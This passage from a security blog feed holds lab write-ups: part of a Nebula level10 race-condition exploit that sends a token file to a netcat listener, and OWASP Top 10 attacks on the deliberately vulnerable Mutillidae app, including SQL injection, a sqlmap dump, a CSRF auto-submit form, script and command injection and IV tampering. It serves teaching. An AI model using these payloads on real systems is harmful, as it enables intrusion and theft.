  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5
6&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#!/bin/bash&lt;/span&gt;

rm -rf /tmp/access
touch /tmp/access
/home/flag10/flag10 /tmp/access 192.168.56.1 &lt;span style=&#34;color: #f8f8f2&#34;&gt;&amp;amp;&lt;/span&gt;
ln -sf /home/flag10/token /tmp/access
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;After a few attempts we receive the token to our netcat listener:&lt;/p&gt;

&lt;p&gt;

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Token&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# nc -lkp 18211
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
root@kali:~# 
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Back inside the Nebula VM:&lt;/p&gt;

&lt;p&gt;

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Flag10&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level10@nebula:/home/flag10$ su flag10 -
Password: 
sh-4.2$ getflag 
You have successfully executed getflag on a target account
sh-4.2$ 
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>OWASP Top 10 in Mutillidae (Part2)</title>
      <link>http://mislusnys.github.io/2015/02/06/owasp-top-10-in-mutillidae-part-2/</link>
      <pubDate>Fri, 06 Feb 2015 04:29:36 +0000</pubDate>
      
      <guid>http://mislusnys.github.io/2015/02/06/owasp-top-10-in-mutillidae-part-2/</guid>
      <description>

&lt;p&gt;This post is continuation from &lt;a href=&#34;http://mislusnys.github.io/2015/02/03/owasp-top-10-in-mutillidae/&#34; title=&#34;Part 1&#34;&gt;previous post&lt;/a&gt;. We explore less common, however, still potentially very dangerous &lt;em&gt;OWASP Top 10&lt;/em&gt; threats.
Here we go through 6th to 10th places in the list.&lt;/p&gt;

&lt;h2 id=&#34;a6-sensitive-data-exposure:dae1cab322183177c511022ba8a7d0b0&#34;&gt;A6 Sensitive Data Exposure&lt;/h2&gt;

&lt;p&gt;Many web applications do not properly protect sensitive data, such as credit cards, tax IDs, and authentication credentials. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes. Sensitive data deserves extra protection such as encryption at rest or in transit, as well as special precautions when exchanged with the browser.&lt;/p&gt;

&lt;p&gt;Sensitive data can be extracted from HTML storage, HTTP headers or in this example even from HTML comments in the page source code (&lt;em&gt;index.php&lt;/em&gt;):&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;!-- I think the database password is set to blank or perhaps samurai.&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;It depends on whether you installed this web app from irongeeks site or&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;are using it inside Kevin Johnsons Samurai web testing framework.&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;It is ok to put the password in HTML comments because no user will ever see&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;this comment. I remember that security instructor saying we should use the&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;framework comment symbols (ASP.NET, JAVA, PHP, Etc.)&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;rather than HTML comments, but we all know those&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;security instructors are just making all this up. --&amp;gt;&lt;/span&gt;			&lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;!-- End Content --&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2 id=&#34;a7-missing-function-level-access-control:dae1cab322183177c511022ba8a7d0b0&#34;&gt;A7 Missing Function Level Access Control&lt;/h2&gt;

&lt;p&gt;Most web applications verify function level access rights before making that functionality visible in the UI. However, applications need to perform the same access control checks on the server when each function is accessed. If requests are not verified, attackers will be able to forge requests in order to access functionality without proper authorization.&lt;/p&gt;

&lt;p&gt;First example in mutillidae is the &lt;code&gt;robots.txt&lt;/code&gt; file:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;User-agent: *
Disallow: passwords/
Disallow: config.inc
Disallow: classes/
Disallow: javascript/
Disallow: owasp-esapi-php/
Disallow: documentation/
Disallow: phpmyadmin/
Disallow: includes/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;While it prevents web crawlers from indexing these files and folders, it also gives the attacker information about the structure of the website. And in this case even provides with sensitive information directly (The &lt;em&gt;passwords&lt;/em&gt; folder
contains information about few legitimate accounts).&lt;/p&gt;

&lt;p&gt;Another &amp;ldquo;security by obscurity&amp;rdquo; example is &amp;ldquo;secret&amp;rdquo; administrative or configuration pages. Using Burp-Intruder in sniper mode or dirbuster we could find secret pages. Sometimes they are very obvious such as
&lt;em&gt;secret.php, admin.php, administrator.php&lt;/em&gt;. In our case &lt;code&gt;phpmyadmin.php&lt;/code&gt; page is accessible to anyone, even anonymous user.&lt;/p&gt;

&lt;h2 id=&#34;a8-cross-site-request-forgery-csrf:dae1cab322183177c511022ba8a7d0b0&#34;&gt;A8 Cross-Site Request Forgery (CSRF)&lt;/h2&gt;

&lt;p&gt;A CSRF attack forces a logged-on victim&amp;rsquo;s browser to send a forged HTTP request, including the victim&amp;rsquo;s session cookie and any other automatically included authentication information, to a vulnerable web application. This allows the attacker to force the victim&amp;rsquo;s browser to generate requests the vulnerable application thinks are legitimate requests from the victim.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;add-to-your-blog.php&lt;/code&gt; page is vulnerable to CSRF. We can intercept the POST request with burp:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2015/02/06/burp.png&#34; alt=&#34;burp&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Using this information we can construct a malicious form which submits the data upon loading the page (onload function):&lt;/p&gt;



&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;HTML Injection&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5
6
7
8
9&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;html&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;&amp;gt;&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;body&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;onload&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;document.createElement(&amp;#39;form&amp;#39;).submit.call(document.getElementById(&amp;#39;evil&amp;#39;))&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;&amp;gt;&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;form&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;evil&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;action&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;http://192.168.1.66/mutillidae/index.php?page=add-to-your-blog.php&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;method&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;post&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;enctype&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;application/x-www-form-urlencoded&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;&amp;gt;&lt;/span&gt; 
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;csrf-token&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;/&amp;gt;&lt;/span&gt; 
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;blog_entry&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;I made you post this!&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;/&amp;gt;&lt;/span&gt; 
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;add-to-your-blog-php-submit-button&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Save+Blog+Entry&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;/&amp;gt;&lt;/span&gt; 
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;form&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;&amp;gt;&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;body&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;html&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;


&lt;p&gt;If logged in user (with a valid session token) visits this malicious page, then a new blog post is made on the users behalf:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2015/02/06/blog.png&#34; alt=&#34;blog&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;a9-using-components-with-known-vulnerabilities:dae1cab322183177c511022ba8a7d0b0&#34;&gt;A9 Using Components with Known Vulnerabilities&lt;/h2&gt;

&lt;p&gt;Components, such as libraries, frameworks, and other software modules, almost always run with full privileges. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications using components with known vulnerabilities may undermine application defenses and enable a range of possible attacks and impacts.&lt;/p&gt;

&lt;p&gt;In our case obtaining information about the server components is pretty easy (&lt;em&gt;phpinfo.php&lt;/em&gt;):&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2015/02/06/info.png&#34; alt=&#34;info&#34; /&gt;&lt;/p&gt;

&lt;p&gt;However, in this case the server components have no known vulnerabilities (at the time of writing).&lt;/p&gt;

&lt;h2 id=&#34;a10-unvalidated-redirects-and-forwards:dae1cab322183177c511022ba8a7d0b0&#34;&gt;A10 Unvalidated Redirects and Forwards&lt;/h2&gt;

&lt;p&gt;Web applications frequently redirect and forward users to other pages and websites, and use untrusted data to determine the destination pages. Without proper validation, attackers can redirect victims to phishing or malware sites, or use forwards to access unauthorized pages.&lt;/p&gt;

&lt;p&gt;In our case the credits page is vulnerable to unvalidated redirect.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;http://192.168.1.66/mutillidae/index.php?page=redirectandlog.php&amp;amp;forwardurl=http://www.owasp.org&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Here, the &lt;code&gt;forwardurl&lt;/code&gt; specifies the redirection url and the attacker can point to a malicious page. Unvalidated redirects can increase the success rate in phishing attacks, because the first part of the link looks &amp;ldquo;legit&amp;rdquo;.&lt;/p&gt;

&lt;h2 id=&#34;summary:dae1cab322183177c511022ba8a7d0b0&#34;&gt;Summary&lt;/h2&gt;

&lt;p&gt;&lt;em&gt;OWASP Top 10&lt;/em&gt; describes most common web vulnerabilities found in the real world. &lt;em&gt;Mutillidae II&lt;/em&gt; is deliberately vulnerable web application and contains at least one vulnerability from each OWASP category. It provides good
insight into majority of web related exploitation methods.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>OWASP Top 10 in Mutillidae (Part1)</title>
      <link>http://mislusnys.github.io/2015/02/03/owasp-top-10-in-mutillidae/</link>
      <pubDate>Tue, 03 Feb 2015 10:48:16 +0000</pubDate>
      
      <guid>http://mislusnys.github.io/2015/02/03/owasp-top-10-in-mutillidae/</guid>
      <description>

&lt;h2 id=&#34;intro:3a3e9037ddd6e7a6645f41b17becbe3a&#34;&gt;Intro&lt;/h2&gt;

&lt;p&gt;&lt;em&gt;OWASP Mutillidae II&lt;/em&gt; is a free, open source, deliberately vulnerable web-application providing a target for web-security enthusiast. It features many vulnerabilities and challenges.
Contains at least one vulnerability for each of the &lt;em&gt;OWASP Top Ten&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;For this writeup Mutillidae version 2.6.17 inside XAMPP (Windows 7) was used (&lt;em&gt;Security Level: 0&lt;/em&gt;).&lt;/p&gt;

&lt;p&gt;The OWASP Top 10 - 2013 is as follows:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#a1&#34;&gt;A1 Injection&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#a2&#34;&gt;A2 Broken Authentication and Session Management&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#a3&#34;&gt;A3 Cross-Site Scripting (XSS)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#a4&#34;&gt;A4 Insecure Direct Object References&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#a5&#34;&gt;A5 Security Misconfiguration&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;A6 Sensitive Data Exposure&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;A7 Missing Function Level Access Control&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;A8 Cross-Site Request Forgery (CSRF)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;A9 Using Components with Known Vulnerabilities&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;A10 Unvalidated Redirects and Forwards&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;a-name-a1-a-a1-injection:3a3e9037ddd6e7a6645f41b17becbe3a&#34;&gt;&lt;a name=&#34;a1&#34;&gt;&lt;/a&gt; A1 Injection&lt;/h2&gt;

&lt;p&gt;Injection flaws, such as SQL, OS, and LDAP injection occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.&lt;/p&gt;

&lt;h3 id=&#34;sql-injections:3a3e9037ddd6e7a6645f41b17becbe3a&#34;&gt;SQL Injections&lt;/h3&gt;

&lt;p&gt;The first SQL injection is in the login page. If we input single quote as password and try to login, the app conveniently shows us the SQL query (in the error message):&lt;/p&gt;

&lt;p&gt;&lt;code&gt;SELECT * FROM accounts WHERE username=&#39;&#39; AND password=&#39;&#39;&#39;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;We can see that both username and password fields should be injectable. We can use that information to login as any user. Using username &lt;code&gt;admin&#39;-- -&lt;/code&gt; and any password or username &lt;code&gt;admin&lt;/code&gt; and password &lt;code&gt;&#39; or 1=1-- -&lt;/code&gt; we can login as admin.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2015/02/03/admin.png&#34; alt=&#34;admin&#34; /&gt;&lt;/p&gt;

&lt;p&gt;There&amp;rsquo;s another SQL injection in the &lt;code&gt;view-someones-blog.php&lt;/code&gt; page. Let&amp;rsquo;s use &lt;code&gt;burp&lt;/code&gt; and &lt;code&gt;sqlmap&lt;/code&gt; to automate the exploitation. First we intercept the HTTP request with burp and save it to a file:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2015/02/03/request.png&#34; alt=&#34;request&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Then we can use the request file with sqlmap and extract data from the database(s):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sqlmap -r ~/request --dbs
[05:56:08] [INFO] the back-end DBMS is MySQL
web server operating system: Windows
web application technology: PHP 5.6.3, Apache 2.4.10
back-end DBMS: MySQL 5.0
[05:56:08] [INFO] fetching database names
available databases [8]:
[*] cdcol
[*] information_schema
[*] mysql
[*] nowasp
[*] performance_schema
[*] phpmyadmin
[*] test
[*] webauth
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We can dump user account data:&lt;/p&gt;



&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;SQLMap Table Dump&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;Database: nowasp
Table: accounts
[23 entries]
+-----+----------+---------------+----------+--------------+-----------+-----------------------------------------+
| cid | username | lastname      | is_admin | password     | firstname | mysignature                             |
+-----+----------+---------------+----------+--------------+-----------+-----------------------------------------+
| 9   | simba    | Lion          | FALSE    | password     | Simba     | I am a super-cat                        |
| 8   | bobby    | Hill          | FALSE    | password     | Bobby     | Hank is my dad                          |
| 7   | jim      | Rome          | FALSE    | password     | Jim       | Rome is burning                         |
| 6   | samurai  | WTF           | FALSE    | samurai      | Samurai   | Carving fools                           |
| 5   | bryce    | Galbraith     | FALSE    | password     | Bryce     | I Love SANS                             |
| 4   | jeremy   | Druin         | FALSE    | password     | Jeremy    | d1373 1337 speak                        |
| 3   | john     | Pentest       | FALSE    | monkey       | John      | I like the smell of confunk             |
| 2   | adrian   | Crenshaw      | TRUE     | somepassword | Adrian    | Zombie Films Rock!                      |
| 23  | ed       | Skoudis       | FALSE    | pentest      | Ed        | Commandline KungFu anyone?              |
| 22  | james    | Jardine       | FALSE    | i&amp;lt;3devs      | James     | Occupation: Researcher                  |
| 21  | CHook    | Hook          | FALSE    | JollyRoger   | Captain   | Gator-hater                             |
| 20  | PPan     | Pan           | FALSE    | NotTelling   | Peter     | Where is Tinker?                        |
| 1   | admin    | Administrator | TRUE     | adminpass    | System    | g0t r00t?                               |
| 19  | ABaker   | Baker         | TRUE     | SoSecret     | Aaron     | Muffin tops only                        |
| 18  | tim      | Tomes         | FALSE    | lanmaster53  | Tim       | Because reconnaissance is hard to spell |
| 17  | rocky    | Paws          | FALSE    | stripes      | Rocky     | treats?                                 |
| 16  | patches  | Pester        | FALSE    | tortoise     | Patches   | meow                                    |
| 15  | dave     | Kennedy       | FALSE    | set          | Dave      | Bet on S.E.T. FTW                       |
| 14  | kevin    | Johnson       | FALSE    | 42           | Kevin     | Doug Adams rocks                        |
| 13  | john     | Wall          | FALSE    | password     | John      | Do the Duggie!                          |
| 12  | cal      | Calipari      | FALSE    | password     | John      | C-A-T-S Cats Cats Cats                  |
| 11  | scotty   | Evil          | FALSE    | password     | Scotty    | Scotty do                               |
| 10  | dreveil  | Evil          | FALSE    | password     | Dr.       | Preparation H                           |
+-----+----------+---------------+----------+--------------+-----------+-----------------------------------------+
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;


&lt;h3 id=&#34;other-injections:3a3e9037ddd6e7a6645f41b17becbe3a&#34;&gt;Other Injections&lt;/h3&gt;

&lt;h4 id=&#34;html-javascript-injection:3a3e9037ddd6e7a6645f41b17becbe3a&#34;&gt;HTML/Javascript Injection&lt;/h4&gt;

&lt;p&gt;These injections occur when user input ends up in a generated web page and is treated as code rather than text.
In the &lt;code&gt;browser-info.php&lt;/code&gt; page we can see information about our browser, such as User-Agent, Referrer, cookie information, etc.
If we modify User-Agent string (via browser add-ons or burp) to be:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(&#39;User Agent injection!&#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;We can see that it becomes part of the page code:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2015/02/03/ua.png&#34; alt=&#34;User-Agent&#34; /&gt;&lt;/p&gt;

&lt;p&gt;It is actually displayed two times, because it is included in two different places within the page.&lt;/p&gt;

&lt;h4 id=&#34;command-injection:3a3e9037ddd6e7a6645f41b17becbe3a&#34;&gt;Command Injection&lt;/h4&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2015/02/03/dns.png&#34; alt=&#34;DNS&#34; /&gt;&lt;/p&gt;

&lt;p&gt;In this page the user input is intended to a shell command&amp;rsquo;s argument. However, most shells support stacked commands and if user input is not sanitized, we can execute additional commands in the context of the web server.
In Linux we can add additional commands with &lt;code&gt;;&lt;/code&gt; and in Windows with &lt;code&gt;&amp;amp;&lt;/code&gt; or &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;&amp;amp; dir&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;will result in:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2015/02/03/dir.png&#34; alt=&#34;dir&#34; /&gt;&lt;/p&gt;

&lt;!--
#### XML Injection
--&gt;

&lt;h2 id=&#34;a-name-a2-a-a2-broken-authentication-and-session-management:3a3e9037ddd6e7a6645f41b17becbe3a&#34;&gt;&lt;a name=&#34;a2&#34;&gt;&lt;/a&gt; A2 Broken Authentication and Session Management&lt;/h2&gt;

&lt;p&gt;Application functions related to authentication and session management are often not implemented correctly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities.&lt;/p&gt;

&lt;p&gt;Mutillidae has a page called &amp;ldquo;View User Privilege Level&amp;rdquo; where an attacker can escalate to root privileges by attacking a weak encryption mechanism.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2015/02/03/priv.png&#34; alt=&#34;priv&#34; /&gt;&lt;/p&gt;

&lt;p&gt;This page has a default http parameter &lt;code&gt;iv=6bc24fc1ab650b25b4114e93a98f1eba&lt;/code&gt; which somehow encodes the 3 ids shown in the picture.
By changing various bytes in the &lt;code&gt;iv&lt;/code&gt; parameter we can change the values displayed on the page. After a few tries we can see that &lt;strong&gt;5th&lt;/strong&gt; and &lt;strong&gt;8th&lt;/strong&gt; byte directly correspond to the first chars of &lt;code&gt;UID&lt;/code&gt; and &lt;code&gt;GID&lt;/code&gt;.
With the value 6bc24fc1&lt;strong&gt;&lt;em&gt;00&lt;/em&gt;&lt;/strong&gt;650b&lt;strong&gt;&lt;em&gt;00&lt;/em&gt;&lt;/strong&gt;b4114e93a98f1eba,
we have &lt;code&gt;0x9a&lt;/code&gt; and &lt;code&gt;0x14&lt;/code&gt; as first &lt;code&gt;UID&lt;/code&gt; and &lt;code&gt;GID&lt;/code&gt; chars respectively. Normally we could use burp to brute force the values (256 + 256 tries), but here simple &lt;code&gt;XOR&lt;/code&gt; is used, so we
can do it by hand. We are looking for values that &lt;code&gt;XOR&lt;/code&gt; with &lt;code&gt;0x9a&lt;/code&gt; and &lt;code&gt;0x14&lt;/code&gt; and produce &lt;code&gt;0x30&lt;/code&gt;. Since &lt;code&gt;XOR&lt;/code&gt; is communicative, we can calculate:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;0x9A XOR 0x30 = 0xAA
0x14 XOR 0x30 = 0x24
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Using 6bc24fc1&lt;strong&gt;&lt;em&gt;aa&lt;/em&gt;&lt;/strong&gt;650b&lt;strong&gt;&lt;em&gt;24&lt;/em&gt;&lt;/strong&gt;b4114e93a98f1eba value we get:&lt;/p&gt;

